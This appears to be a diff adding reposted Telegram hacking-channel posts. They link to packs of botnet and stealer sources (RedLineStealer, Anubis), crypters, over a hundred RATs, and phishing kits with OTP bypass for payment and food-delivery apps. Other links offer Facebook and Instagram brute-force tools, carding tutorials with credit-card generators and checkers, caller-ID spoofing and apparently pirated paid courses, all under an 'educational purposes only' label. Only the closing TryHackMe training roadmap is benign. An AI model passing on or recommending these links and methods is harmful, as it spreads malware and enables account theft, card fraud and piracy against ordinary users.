@@ -3,6 +3,539 @@
 Video Belajar Coding Dan Hacking
 
 
+
+
+🤖 BOTNET STUFF
+
+The best pack for malware researcher, spammers and virus spreaders!
+
+⚠️ FOR EDUCATIONAL PURPOSE ONLY ⚠️
+
+🔥 Botnets
+▪️Anubis 7.0
+▪️Botnets-Pack(lots of botnets sources)
+▪️M0AB-RAT V6
+▪️RedLineStealer
+🔗 Download : https://mega.nz/folder/dAwWDKLS#_sJMzYUE3QXzU_ah4tsz2Q/folder/QR5yUKKS
+
+🔥Crypers
+▪️Huge Crypt Pack (more than 40+ crypters)
+▪️Premium Runtime Crypt
+▪️WarCrypter
+🔗 Download : https://mega.nz/folder/dAwWDKLS#_sJMzYUE3QXzU_ah4tsz2Q/folder/tAwghaiC
+
+🔥 RATs
+▪️rats.zip (More than 100+ RATs)
+▪️WSH Rat (video here : https://www.youtube.com/watch?v=MENrCAcOaZM )
+🔗 Download : https://mega.nz/folder/dAwWDKLS#_sJMzYUE3QXzU_ah4tsz2Q/folder/AIwSjQrD
+
+🔥 Botnet Resources
+▪️Coding Botnet & Backdoor In Python For Ethical Hacking
+▪️Botnet Course (Some explanations)
+▪️Botnet-Infos
+▪️Course 2 & 3 (More infos)
+🔗 Download : https://mega.nz/folder/dAwWDKLS#_sJMzYUE3QXzU_ah4tsz2Q/folder/AAgiiI4a
+
+🔰 MEGA INSTAGRAM HACKPACK 🔰
+
+Credit :- Click here
+
+⭕Hack Instagram account with fake followers technique (Video Tutorial Leaked)
+
+⭕Hack Instagram using Kali Linux(Video Tutorial)
+
+⭕Hack Instagram Using Termux (Video Tutorial)
+
+⭕The Complete Security And Hacking On Instagram Advanced Course
+
+⭕How to Hack Instagram using bruteforce method
+
+⭕Hack Instagram with best working methods
+
+⭕Hijack Instagram method
+
+⭕Instagram Hacking script with bruteforce attacking using termux
+
+⭕Instagram Hacking using fake login page by phishing method
+
+⭕Instagram Hacking method using termux tools
+
+⭕Instagram verification method
+
+⭕Instagram Xtreme Mod Apk 2020 Updated Apk
+
+⭕Instagram Black Mod Apk
+
+⭕Instagram Xtreme Black Mod Apk Pro
+
+⭕Anti Revoke Messages Apk(Get All Deleted Messages on Instagram)
+
+⭕Instagram Hypervote Terminal
+
+⭕Method toTrack location of a person chatting on Instagram method
+
+⭕Method to Get a verified badge on Instagram
+
+⭕Method To Get Delete Instagram Search History And Recover it Back
+
+⭕Top 10 Instagram Free likes and followers Sites
+
+⭕Instagram BOT Gain Followers With Autofollow like and Unfollow
+
+⭕Instagram Followers Course Worth1200$
+
+https://www.mediafire.com/file/uzu562fkd5mwk4z/MEGA_INSTAGRAM_HACKPACK.zip/file
+
+❤️#50k As I promised
+
+✖️ @HackingCraze ✖️
+
+​​🔰 Ultimate Password Hacking Cracking Course 🔰
+
+♻️ Contains :-
+
+🌀 Phishing
+🌀 Keylogger
+🌀 Bruteforce
+🌀 Guessing
+🌀 SocialEngineering
+
+💰 Worth :- 199$ [ FREE FOR YOU ]
+
+⭕️ Link :- https://drive.google.com/drive/u/0/mobile/folders/14BMyl2qz7taCDpVknYjd9hVdYT8lgguj
+
+🔺 Unmute And Support Us 🔻
+➖ @Anonym0us_HackerZZ ➖
+
+😍 WORLD MOST DANGEROUS & POWERFULL HACKERS TOOLS EXPOSE 😍
+
+⚠️Only for learning & Educational Purpose ⚠️
+
+Pish web tool
+🔗 Link : https://github.com/Cabdulahi/pish
+
+❇️ MITM attack tool
+🔗 Link : https://github.com/websploit/websploit
+
+❇️ kill shot pentesting framework
+🔗 Link :https://github.com/bahaabdelwahed/killshot
+
+❗ Facebook Tool Links ❗
+
+❇️ Facebook information gathering
+🔗 Link : git clone https://github.com/CiKu370/OSIF.git @Tricks_Hub
+
+❇️ Facebook Toolkit + bots, dump private data
+🔗 Link : https://github.com/warifp/FacebookToolkit
+
+❇️ Facebook cracking tool Fcrack.py
+🔗 Link : https://github.com/INDOnimous/FB-Crack-
+
+❇️ Facebook and yahoo account cloner
+🔗 Link : https://gitlab.com/W1nz0N/fyc.git
+
+❇️ Facebook report tool
+🔗 Link : git clone https://github.com/IlayTamvan/Report
+
+❇️ Facebook BruteFoRce Tool
+🔗 Link : https://github.com/IAmBlackHacker/Facebook-BruteForce
+
+⭕️ Facebook hacking ASU
+🔗 Link : git clone https://github.com/LOoLzeC/ASU
+
+⭕️ Facebook Downloader
+🔗 Link : https://github.com/barba99/facebook-spotify-youtube-descargar
+
+⭕️ Hack Facebook MBF
+🔗 Link : git clone https://github.com/Rizky-ID/autombf
+
+⭕️ Facebook Repot3
+🔗 Link : git clone https://github.com/PangeranAlvins/Repot3
+
+⭕️ Facebook Information Gathering
+🔗 Link : https://github.com/xHak9x/fbi
+
+⭕️ Facebook Brute with TOR
+🔗 Link : https://github.com/thelinuxchoice/facebash
+
+❗Networking Tool Links❗
+
+⭕️ ip camera 📷 hacking
+🔗 Link : https://github.com/kancotdiq/ipcs
+
+⭕️ Termux Lazyscript tool
+🔗 Link : https://github.com/TechnicalMujeeb/Termux-Lazyscript
+
+⭕️ TMscanner Tool
+🔗 Link : https://github.com/TechnicalMujeeb/TM-scanner
+
+⭕️ Trace location with IP
+🔗 Link : https://github.com/Rajkumrdusad/IP-Tracer
+
+⭕️ WPS Wi-Fi hacking tool
+🔗 Link : https://github.com/nxxxu/AutoPixieWps
+
+⭕️ Routersploit - vulnerability scanner and attacker
+🔗 Link : https://github.com/reverse-shell/routersploit.git
+
+⭕️ Local network exploiting tool Zarp
+🔗 Link : https://github.com/hatRiot/zar
+
+⭕️ ip tracker, Device info by link
+🔗 Link : https://github.com/lucasfarre/ip-tracker
+
+⭕️ Ip-Fy IP address information
+🔗 Link : https://github.com/T4P4N/IP-FY.git
+
+⭕️ Wifite Wi-Fi hacking tool
+🔗 Link : https://github.com/derv82/wifite
+
+❗ Phishing Tool Links ❗
+
+⭕️ Modern phishing tool hidden eye
+🔗 Link :https://github.com/DarkSecDevelopers/HiddenEye
+
+⭕️ complete phishing tool 32 templates + 1 customizable
+🔗 Link :https://github.com/thelinuxchoice/blackeye
+
+⭕️ social media phishing with shellphish
+🔗 Link : https://github.com/thelinuxchoice/shellphish
+
+⭕️ Advance Phishing OTP Bypass
+🔗 Link : https://github.com/Ignitetch/AdvPhishing
+
+⭕️ Paytm Phishing OTP Bypass
+🔗 Link : https://github.com/Ignitetch/Paytm-Phishing
+
+⭕️ UberEats Phishing OTP Bypass
+🔗 Link : https://github.com/Ignitetch/UberEats-Phishing
+
+⭕️ Whats App Phishing
+🔗 Link : https://github.com/Ignitetch/whatsapp-phishing
+
+⭕️Zomato Phishing
+🔗 Link : https://github.com/Ignitetch/Zomato-Phishing
+
+⭕️ hotstar OTP Bypass
+🔗 Link : https://github.com/Ignitetch/Hotstar-otp-bypass
+
+⭕️ Ola OTP Bypass
+🔗 Link ::-)https://github.com/Ignitetch/ola-otpbypass
+
+⭕️ Amazon Payment Gateway Phishing
+🔗 Link : https://github.com/Ignitetch/Amazon-payment-gateway-phishing
+
+Enjoy 👍 @SoUmYaJiT_SJ
+
+♻️Share our channel for more content♻️
+
+🔰 THE BIGGEST CRACKING PACK "THE PACK OF THE GODS 3.0 🔰
+
+Contains :-
+🔹 Proxy checkers
+🔹 Proxy grabbers
+🔹 SQL Tools
+🔹 Dork making tools
+🔹 Combo making tools
+🔹 Parsers
+🔹 Testers
+🔹 Checkers
+🔹 SQLi Dumper
+🔹 And Many Such Tools
+
+Credits To The Original Owner Who Have Collected These Tools
+
+Original Costs :- $1000
+
+Download Link :-
+https://anonfiles.com/X0Ibc6u1o1/THE_PACK_OF_THE_GODS_3.0_-BIG_BANG_UPDATE_APRIL_28-_2020_rar
+
+🔅🔅 @SoUmYaJiT_SJ 🔅🔅
+
+🔥 31 Paid Courses Full links
+
+‍ 🔰Hadoop Fundamentals🔰
+https://drive.google.com/drive/folders/1xICarprcfM4CkFR-veb23lCd6rnhV0Xs
+
+🔰Cybersecurity Collection🔰
+https://drive.google.com/drive/folders/1q2sOBNU4lPBkwtF1Msl6uCACBV5TUGWD
+
+🔰Machine Learning for Apps🔰
+https://drive.google.com/folderview?id=12rfOJrpUj9vt9HYg66djxYDads4HmGDB
+
+🔰Advanced React and Redux🔰
+https://drive.google.com/folderview?id=1Tk_-NOXDJ2xuKefQ-r0TiwSvYz0ejKgd
+
+🔰Web Developer Nanodegree🔰
+https://drive.google.com/folderview?id=1-HJRjs2jM-dS9toH46dic4h7Gwnlk_hS
+
+🔰Computer Vision Nanodegree🔰
+https://drive.google.com/folderview?id=1770Z6Rw8tSq2iXjS2X_MoJwUd6EuZxCq
+
+🔰Millionaire DJ FL Studio 12 - Pro Music Production Course🔰
+https://drive.google.com/folderview?id=1soqPKlzEak7BvAK0LTwMm-PdvbhQ6pX5
+
+🔰Pentester Academy - x86 Assembly Language and Shellcoding on Linux🔰
+https://drive.google.com/folderview?id=1KKKlL5TzdXDIxrSOz0Gmz3RWGTh_0Xli
+
+🔰Kali linux - Complete Training Program from Scratch course🔰
+https://drive.google.com/folderview?id=1714TBeP8chDWSIPCcALAuEM5ZNQsLYsn
+
+🔰Complete Machine Learning and Data Science Zero to Mastery🔰
+https://drive.google.com/folderview?id=1bFcmRP5EAtksPtjiuV9qpHyNK6sci8WM
+
+🔰Python Ethical Hacking Build tools for ethical hacking🔰
+https://drive.google.com/drive/folders/1aBX4Y0cqQSZJZoPiweGEkvyJ05r3SdJY
+
+🔰Deep Learning With TensorFlow Videos🔰
+https://drive.google.com/folderview?id=1_az7Ue500bdT-R25qGrhitqhaxNILcxG
+
+🔰Bug Bounty Hunting Guide to an Advanced Earning Method🔰
+https://drive.google.com/drive/folders/1ytZk4T1EnPPwmtt9FJX0BjNPnafzPWwr
+
+🔰Build Responsive Real World Websites with HTML5 and CSS3🔰
+https://drive.google.com/folderview?id=1WJ-oGlQJFt4PTg2BE1ZKTvronD8HOONb
+
+🔰Deep Reinforcement Learning Nanodegree v1.0.0🔰
+https://drive.google.com/folderview?id=1joMAOhnqM6pTu4xyS01MEpZUUT1g4llq
+
+🔰The Complete ASP.NET MVC 5 Course🔰
+https://drive.google.com/folderview?id=1izOIk6Xzdnkxi9C-qtUOmB2kgLULfsP5
+
+🔰The Python Mega Course Build 10 Real World Applications🔰
+https://drive.google.com/folderview?id=1n2VVih2IcFdGJ6smCB5nJ5hYu42lT5kn
+
+🔰Learn Python & Ethical Hacking From Scratch🔰
+https://drive.google.com/uc?id=1wZ8bW3acJa9CHS9672-Ydo04X3yLrsUt&export=download
+
+🔰Learn Ethical Hacking From Scratch🔰
+https://drive.google.com/folderview?id=1Ns62tznu2mj7Q0QktrWGCcNsrL5CigtN
+
+🔰Photoshop CC In an Easy Simple Professional Way🔰
+https://drive.google.com/folderview?id=1fTWvTMI318u22eVddaaZ3flZ6IRUB44d
+
+🔰Learn Python & Ethical Hacking From Scratch🔰
+https://drive.google.com/folderview?id=1JeqDaWOu0kSdNGFEcwwI9q_LpLqnIp8f
+
+🔰Website Hacking Course 2018 Earn Money by doing Bug Bounty🔰
+https://drive.google.com/drive/folders/1fePVylnQPWj_84-nx9PThfcpwJTtv-9C
+
+🔰Deep Learning Nanodegree Program🔰 https://drive.google.com/folderview?id=1muTggFfCeT41P6dSALVUoPYMAFW639cB
+
+🔰Linux Foundation Certified Engineer (2019)🔰
+https://drive.google.com/folderview?id=1qyliHCTOiqEa38IaD226mdD0LHLABlAC
+
+🔰Ethical Hacking With Python, JavaScript and Kali Linux🔰
+https://drive.google.com/folderview?id=1wniooIDbtt7yI9tx1sCjVdKn3ftZNas2
+
+🔰Natural Language Processing Nanodegree v1.0.0🔰
+https://drive.google.com/folderview?id=1cg-msrtVjaxqoMg_LkjJunh999o9lv9U
+
+🔰Python for Finance Investment Fundamentals & Data Analytics🔰
+https://drive.google.com/folderview?id=1T4FMqAmZ1KfK_f8TsdZdHREEG8Z6U8Nl
+
+🔰AZ-103 AZ-104 Azure Administrator Exam Certification 2020🔰
+https://drive.google.com/folderview?id=1j3itB8pRO7ckY-YciIYE_7zhV50mwcq1
+
+🔰CSS - The Complete Guide 2020 (incl. Flexbox, Grid Sass)🔰
+https://drive.google.com/folderview?id=1zTjlqkSyXqmFHdTr2rGAAnx3_XCt3qIw
+
+🔰AWS Certified Solutions Architect - Associate 2020🔰
+https://drive.google.com/folderview?id=14eS7Bpil9ZQWo44NYDNWWGJ9Fam9up6B
+
+🔰Google Data Studio A-Z for Data Visualization and Dashboards🔰
+https://drive.google.com/folderview?id=11vvsLQCiXgg2BlA3mHIJw7sNS_MS-S3_
+
+Note: The google drive links will only be open in browser.
+You will find error when you try to open from telegram.
+
+For BGMI HACKS JOIN :- https://t.me/+u4hZ70_8T8I0OGM9
+
+Share for more🔥🔥🔥
+
+➖ @HackingCraze ➖
+
+🔰 Hacking Books For The Hackers 🔰
+
+🌀 This Is The Collection Of The Most Requested Hacking Books And We're Providing It For FREE.
+
+🔅 Worth - 72$ [ GIVING FREE FOR YOU ]
+
+📎Link :- https://mega.nz/folder/SlhihQKb#0ggUkIVF4bZcug2Ms2Wu1g
+
+🔺 Unmute And Support Us 🔻
+➖ @Anonym0us_HackerZZ ➖
+
+🌀 COLLECTION OF COURSES FROM BLACKHAT PAKISTAN WHICH IS USED TO SEL🌀
+
+🎁 All the content's are mentioned in Download Page.
+
+🔗 Link :- https://mega.nz/folder/oktRyI7J#ELKbpZV4oOACa49Y_nj_-A
+
+👤 @SoUmYaJiT_SJ
+
+🔰Biggest Hack Pack🔰
+
+◾️ Free 1 Month Netflix Trick [You Can Create Unlimited Account]
+◾️ Free Netflix using PayPal [Video]
+◾️Free Amazon Prime Trick [Video]
+◾️ Hotstar Cracking Trick [Video]
+◾️ How To Bypass Link Shortner
+◾️ Instagram Liker
+◾️ Snow's YouTube Bot
+◾️ YouTube View Booster Bot
+◾️ YouTube Blazzer
+◾️ 50 Android Hacks
+◾️ Amazon Gift Cārds
+Paypal Method
+◾️ Ebay Method
+◾️ Free Amazon Gift Cārd Method
+◾️ Free Pizza Method
+◾️ Flipkart Cārding Tutorial
+◾️ How To Get Fresh Valid Proxy List For Cracking
+◾️ How To Get A Free Master Card
+◾️ How To Get Referrals
+◾️ Bypass Gmail Mobile Verification Trick
+◾️ Bypass Android Pattern Lock Using ADB
+◾️ Get Refund Of GiftCard
+◾️ Facebook Hacking Ebook
+◾️ Get Things From Ebay For Free
+◾️ SEO Secrets
+◾️ Guide To Make Money Online
+◾️ Hack Hotmail
+◾️ Hack Gmail
+◾️ 4 Hacking Methods
+◾️ CC Generator
+◾️ CC Checker
+◾️ Crack WEP in Linux
+◾️ Get Massive YouTube Traffic
+◾️ Get Passes To Pornsites
+◾️ Hack WEP WiFi Password
+◾️ Kick Someone Of A Wireless Network
+◾️ Make $1000's A Week With Torrents
+◾️ Make A Phisher For A Website [Facebook/Instragram/Etc]
+◾️ Make Easy Money As An eBay Affiliate
+◾️ Make Multiple Gmail Accounts With Only 1 Account
+◾️ How To Make Mozilla 30 Times Faster
+◾️ USA Whatsapp Number Trick
+◾️ Collection Of Rare Hacking Ebooks
+◾️ Starbucks Method
+◾️ How To Call Someone From His Own Number [Caller Id Spoofing]
+◾️ Transfer PP Balance Method
+◾️ YouTube RED Trick
+◾️ Gaana Mod App
+◾️ Netflix Mod App
+◾️ Saavn Mod App
+◾️ Express VPN Mod App
+◾️ 7 Reasons a Credit Cārd Is Blocked
+◾️ Amazon Cārding Method [Video]
+◾️ What is Cārding? [Video]
+◾️ Basic Cārding Tutorial
+◾️ Phishing Tutorial
+◾️ Easy Cārdable Sites List
+◾️ Find Local BIN's
+◾️ Cārding For Noobs
+◾️ Cārding Online Tools And Website
+◾️ PayPal Cārding
+◾️ Wallmart Cārding
+◾️ Amazon Cārding [Video]
+◾️ eBay Cārding [Video]
+◾️ How To Find Credit Cārd For Cārding [Video]
+
+📥 Download Link:
+https://drive.google.com/file/d/1BoBPNEYvMnCENDK_IUmA5XLkqbCoUZtr/view?usp=drivesdk
+
+➕ Password: abcd
+
+➖ @Anonymous4Bhai ➖
+
+⛔⛔TRYHACKME ROADMAP⛔⛔
+
+# Level 1 - Intro
+- [ ] OpenVPN https://tryhackme.com/room/openvpn
+- [ ] Welcome https://tryhackme.com/jr/welcome
+- [ ] Intro to Researching https://tryhackme.com/room/introtoresearch
+- [ ] Learn Linux https://tryhackme.com/room/zthlinux
+- [ ] Crash Course Pentesting https://tryhackme.com/room/ccpentesting
+
+Introductory CTFs to get your feet wet
+
+- [ ] Google Dorking https://tryhackme.com/room/googledorking
+- [ ] OHsint https://tryhackme.com/room/ohsint
+- [ ] Shodan.io https://tryhackme.com/room/shodan
+
+# Level 2 - Tooling
+- [ ] Tmux https://tryhackme.com/room/rptmux
+- [ ] Nmap https://tryhackme.com/room/rpnmap
+- [ ] Web Scanning https://tryhackme.com/room/rpwebscanning
+- [ ] Sublist3r https://tryhackme.com/room/rpsublist3r
+- [ ] Metasploit https://tryhackme.com/room/rpmetasploit
+- [ ] Hydra https://tryhackme.com/room/hydra
+- [ ] Linux Privesc https://tryhackme.com/room/linuxprivesc
+- [ ] Web Scanning https://tryhackme.com/room/rpwebscanning
+
+More introductory CTFs
+- [ ] Vulnversity - https://tryhackme.com/room/vulnversity
+- [ ] Blue - https://tryhackme.com/room/blue
+- [ ] Simple CTF https://tryhackme.com/room/easyctf
+- [ ] Bounty Hacker https://tryhackme.com/room/cowboyhacker
+
+# Level 3 - Crypto & Hashes with CTF practice
+- [ ] Crack the hash https://tryhackme.com/room/crackthehash
+- [ ] Agent Sudo https://tryhackme.com/room/agentsudoctf
+- [ ] The Cod Caper https://tryhackme.com/room/thecodcaper
+- [ ] Ice https://tryhackme.com/room/ice
+- [ ] Lazy Admin https://tryhackme.com/room/lazyadmin
+- [ ] Basic Pentesting https://tryhackme.com/room/basicpentestingjt
+
+# Level 4 - Web
+- [ ] OWASP top 10 https://tryhackme.com/room/owasptop10
+- [ ] Inclusion https://tryhackme.com/room/inclusion
+- [ ] Injection https://tryhackme.com/room/injection
+- [ ] Vulnversity https://tryhackme.com/room/vulnversity
+- [ ] Basic Pentesting https://tryhackme.com/room/basicpentestingjt
+- [ ] Juiceshop https://tryhackme.com/room/owaspjuiceshop
+- [ ] Ignite https://tryhackme.com/room/ignite
+- [ ] Overpass https://tryhackme.com/room/overpass
+- [ ] Year of the Rabbit https://tryhackme.com/room/yearoftherabbit
+- [ ] DevelPy https://tryhackme.com/room/bsidesgtdevelpy
+- [ ] Jack of all trades https://tryhackme.com/room/jackofalltrades
+- [ ] Bolt https://tryhackme.com/room/bolt
+
+# Level 5 - Reverse Engineering
+- [ ] Intro to x86 64 https://tryhackme.com/room/introtox8664
+- [ ] CC Ghidra https://tryhackme.com/room/ccghidra
+- [ ] CC Radare2 https://tryhackme.com/room/ccradare2
+- [ ] CC Steganography https://tryhackme.com/room/ccstego
+- [ ] Reverse Engineering https://tryhackme.com/room/reverseengineering
+- [ ] Reversing ELF https://tryhackme.com/room/reverselfiles
+- [ ] Dumping Router Firmware https://tryhackme.com/room/rfirmware
+
+# Level 6 - PrivEsc
+- [ ] Sudo Security Bypass https://tryhackme.com/room/sudovulnsbypass
+- [ ] Sudo Buffer Overflow https://tryhackme.com/room/sudovulnsbof
+- [ ] Windows Privesc Arena https://tryhackme.com/room/windowsprivescarena
+- [ ] Linux Privesc Arena https://tryhackme.com/room/linuxprivescarena
+- [ ] Windows Privesc https://tryhackme.com/room/windows10privesc
+- [ ] Blaster https://tryhackme.com/room/blaster
+- [ ] Ignite https://tryhackme.com/room/ignite
+- [ ] Kenobi https://tryhackme.com/room/kenobi
+- [ ] Capture the flag https://tryhackme.com/room/c4ptur3th3fl4g
+- [ ] Pickle Rick https://tryhackme.com/room/picklerick
+
+# Level 7 - CTF practice
+- [ ] Post Exploitation Basics https://tryhackme.com/room/postexploit
+- [ ] Smag Grotto https://tryhackme.com/room/smaggrotto
+- [ ] Inclusion https://tryhackme.com/room/inclusion
+- [ ] Dogcat https://tryhackme.com/room/dogcat
+- [ ] LFI basics https://tryhackme.com/room/lfibasics
+- [ ] Buffer Overflow Prep https://tryhackme.com/room/bufferoverflowprep
+- [ ] Overpass https://tryhackme.com/room/overpass
+- [ ] Break out the cage https://tryhackme.com/room/breakoutthecage1
+- [ ] Lian Yu https://tryhackme.com/room/lianyu
+
+
+
 🔰 The Complete Ethical Hacking Course 🔰
 
 🌀 Hacking Lab setup | Kali Linux 101
